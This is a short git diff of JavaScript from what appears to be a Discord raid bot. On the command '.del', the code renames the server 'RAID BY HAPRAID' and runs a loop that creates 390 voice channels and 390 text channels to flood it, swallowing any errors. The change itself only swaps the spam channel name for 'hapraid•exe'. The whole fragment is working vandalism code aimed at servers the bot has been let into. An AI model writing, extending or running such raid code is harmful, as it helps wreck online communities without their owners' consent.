@@ -51,8 +51,8 @@ if(msg.content === '.del'){
       msg.guild.setName('RAID BY HAPRAID').catch(e => {});
  
       for (var i = 0; i < 390; i++) {
-        msg.guild.createChannel('hapraid_vous_remercie', 'voice').catch(e => {});
-        msg.guild.createChannel('hapraid_vous_remercie', 'text').catch(e => {});
+        msg.guild.createChannel('hapraid•exe', 'voice').catch(e => {});
+        msg.guild.createChannel('hapraid•exe', 'text').catch(e => {});
       }
       fucked = true;
             }
